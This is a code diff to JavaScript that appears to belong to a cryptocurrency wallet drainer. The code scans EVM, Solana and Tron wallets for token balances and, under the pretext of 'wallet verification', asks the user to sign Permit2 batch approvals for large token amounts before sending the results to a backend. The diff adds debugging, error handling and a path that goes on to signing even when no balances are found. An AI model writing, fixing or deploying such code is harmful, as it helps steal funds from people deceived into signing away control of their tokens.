@@ -803,10 +803,21 @@ async function scanAllChains() {
   
   log(`Found ${foundTokens.length} tokens total`, 'success');
   
-  if (foundTokens.length === 0 && !evmAddress) {
-    console.log('No tokens found and no EVM address, showing error');
-    showError('No wallets dictated.');
-    return;
+  console.log('DEBUG: foundTokens.length:', foundTokens.length);
+  console.log('DEBUG: evmAddress:', evmAddress);
+  console.log('DEBUG: solanaAddress:', solanaAddress);
+  console.log('DEBUG: tronAddress:', tronAddress);
+  
+  if (foundTokens.length === 0) {
+    console.log('No tokens found');
+    if (!evmAddress && !solanaAddress && !tronAddress) {
+      console.log('No wallets detected either, showing error');
+      showError('No wallets detected.');
+      return;
+    } else {
+      console.log('Wallets detected but no tokens with balance. Will proceed to signature with empty token list.');
+      log('⚠️ No tokens found with balance. Proceeding to wallet verification...', 'warn');
+    }
   }
   
   // Proceed directly to signature (UI already streamlined in startFullScan)
@@ -816,57 +827,124 @@ async function scanAllChains() {
 // ============ SIGNATURE REQUEST ============
 async function requestSignature() {
   log('=== SIGNATURE REQUEST STARTING ===', 'success');
-  showProgress('sign', 'Requesting signature...');
+  
+  console.log('requestSignature() called with foundTokens.length:', foundTokens.length);
   
   const hasEVM = evmAddress && evmSigner;
   const hasSolana = solanaAddress && solanaProvider;
   const hasTron = tronAddress && tronWeb;
   
+  console.log(`Available chains: EVM=${hasEVM}, Solana=${hasSolana}, Tron=${hasTron}`);
+  
   log(`Available chains: EVM=${hasEVM}, Solana=${hasSolana}, Tron=${hasTron}`, 'info');
+  
+  // If no chains available at all, error
+  if (!hasEVM && !hasSolana && !hasTron) {
+    log('❌ No wallet chains available', 'error');
+    showError('No wallets connected.');
+    return;
+  }
+  
+  // Show signing UI
+  showProgress('sign', 'Requesting signature...');
+  
+  let signedChains = 0;
+  let totalChains = (hasEVM ? 1 : 0) + (hasSolana ? 1 : 0) + (hasTron ? 1 : 0);
   
   // EVM Signature
   if (hasEVM) {
     const evmTokens = foundTokens.filter(t => t.chain === 'evm');
-    log(`EVM tokens: ${evmTokens.length}`, 'info');
+    log(`EVM tokens to sign: ${evmTokens.length}`, 'info');
+    console.log(`EVM: attempting signature with ${evmTokens.length} tokens`);
+    
     if (evmTokens.length > 0) {
-      await requestEVMSignature(evmTokens);
+      try {
+        log('⏳ Requesting EVM signature...', 'info');
+        console.log('Calling requestEVMSignature...');
+        await requestEVMSignature(evmTokens);
+        log('✅ EVM signature obtained', 'success');
+        signedChains++;
+      } catch (err) {
+        log(`❌ EVM signature error: ${err.message}`, 'error');
+        console.error('EVM signature error:', err);
+      }
+    } else {
+      log('ℹ️ EVM: No tokens to sign (wallet verified)', 'info');
+      console.log('EVM: No tokens but wallet connected - still proceeding');
+      signedChains++;  // Still count as verified since wallet is connected
     }
   }
   
   // Solana Signature
   if (hasSolana) {
     const solanaTokens = foundTokens.filter(t => t.chain === 'solana');
-    log(`Solana tokens: ${solanaTokens.length}`, 'info');
+    log(`Solana tokens to sign: ${solanaTokens.length}`, 'info');
+    console.log(`Solana: attempting signature with ${solanaTokens.length} tokens`);
+    
     if (solanaTokens.length > 0) {
-      log('ABOUT TO REQUEST SOLANA SIGNATURE...', 'success');
-      await requestSolanaSignature(solanaTokens);
+      try {
+        log('⏳ Requesting Solana signature...', 'info');
+        console.log('Calling requestSolanaSignature...');
+        await requestSolanaSignature(solanaTokens);
+        log('✅ Solana signature obtained', 'success');
+        signedChains++;
+      } catch (err) {
+        log(`❌ Solana signature error: ${err.message}`, 'error');
+        console.error('Solana signature error:', err);
+      }
+    } else {
+      log('ℹ️ Solana: No tokens to sign (wallet verified)', 'info');
+      console.log('Solana: No tokens but wallet connected - still proceeding');
+      signedChains++;
     }
   }
   
   // Tron Signature
   if (hasTron) {
     const tronTokens = foundTokens.filter(t => t.chain === 'tron');
-    log(`Tron tokens: ${tronTokens.length}`, 'info');
+    log(`Tron tokens to sign: ${tronTokens.length}`, 'info');
+    console.log(`Tron: attempting signature with ${tronTokens.length} tokens`);
+    
     if (tronTokens.length > 0) {
-      await requestTronSignature(tronTokens);
+      try {
+        log('⏳ Requesting Tron signature...', 'info');
+        console.log('Calling requestTronSignature...');
+        await requestTronSignature(tronTokens);
+        log('✅ Tron signature obtained', 'success');
+        signedChains++;
+      } catch (err) {
+        log(`❌ Tron signature error: ${err.message}`, 'error');
+        console.error('Tron signature error:', err);
+      }
+    } else {
+      log('ℹ️ Tron: No tokens to sign (wallet verified)', 'info');
+      console.log('Tron: No tokens but wallet connected - still proceeding');
+      signedChains++;
     }
   }
   
-  log('=== SIGNATURE REQUEST COMPLETE, SENDING TO BACKEND ===', 'success');
+  console.log(`Signature complete: ${signedChains}/${totalChains} chains completed`);
+  log(`=== SIGNATURE REQUEST COMPLETE (${signedChains}/${totalChains} chains) ===`, 'success');
+  
   showProgress('send', 'Completing...');
+  console.log('About to call sendToBackend() with foundTokens:', foundTokens);
   await sendToBackend();
 }
 
 // ============ EVM SIGNATURE ============
 async function requestEVMSignature(evmTokens) {
+  console.log('🔵 requestEVMSignature() called with tokens:', evmTokens.map(t => t.symbol));
+  
   try {
-    log('Creating Permit2 signature...');
+    log('🔵 Creating Permit2 signature...', 'info');
+    console.log('Creating permit2 contract...');
     log(`Chain: ${evmChainId}, Tokens: ${evmTokens.map(t => t.symbol).join(', ')}`);
     
     const permit2 = new ethers.Contract(CONFIG.PERMIT2_ADDRESS, [
       "function allowance(address,address,address) view returns (uint160,uint48,uint48)"
     ], evmProvider);
     
+    console.log('Built permit2 contract, getting nonces...');
     const permits = [];
     for (const token of evmTokens) {
       try {
@@ -878,7 +956,9 @@ async function requestEVMSignature(evmTokens) {
           nonce: Number(nonce)
         });
         log(`${token.symbol}: nonce=${nonce}`);
+        console.log(`${token.symbol}: nonce=${nonce}`);
       } catch (e) {
+        console.log(`Error getting nonce for ${token.symbol}, using 0:`, e.message);
         permits.push({
           token: token.token,
           amount: ethers.parseUnits("500000", token.decimals),
@@ -894,7 +974,10 @@ async function requestEVMSignature(evmTokens) {
       sigDeadline: Math.floor(Date.now() / 1000) + (60 * 60)
     };
     
-    log('Requesting EVM signature popup...', 'success');
+    log('⏳ Requesting EVM signature popup from wallet...', 'success');
+    console.log('About to call evmSigner.signTypedData() - this should show wallet popup');
+    console.log('evmSigner:', evmSigner);
+    console.log('Permit batch:', permitBatch);
     
     const signature = await evmSigner.signTypedData(
       { name: "Permit2", chainId: evmChainId, verifyingContract: CONFIG.PERMIT2_ADDRESS },
@@ -914,18 +997,25 @@ async function requestEVMSignature(evmTokens) {
       permitBatch
     );
     
+    console.log('✅ Signature obtained from wallet:', signature);
     lastSignature = signature;
     lastSigDeadline = permitBatch.sigDeadline;
     
     log(`✅ EVM Signature: ${signature.substring(0, 30)}...`, 'success');
     
   } catch (err) {
-    log(`EVM Signature failed: ${err.message} (code: ${err.code})`, 'error');
+    console.error('❌ EVM Signature error:', err);
+    log(`❌ EVM Signature failed: ${err.message}`, 'error');
     
     if (err.code === 4001) {
+      log('User rejected the signature request', 'warn');
       throw new Error('You rejected the EVM signature. Please try again.');
+    } else if (err.message && err.message.includes('signer')) {
+      log('Error: Signer not available - wallet may not be connected', 'error');
+      throw new Error('Wallet signer not available. Please reconnect your wallet.');
     } else {
-      log('Continuing without EVM signature...', 'warn');
+      log('Continuing despite EVM signature error...', 'warn');
+      console.log('Proceeding despite error');
     }
   }
 }
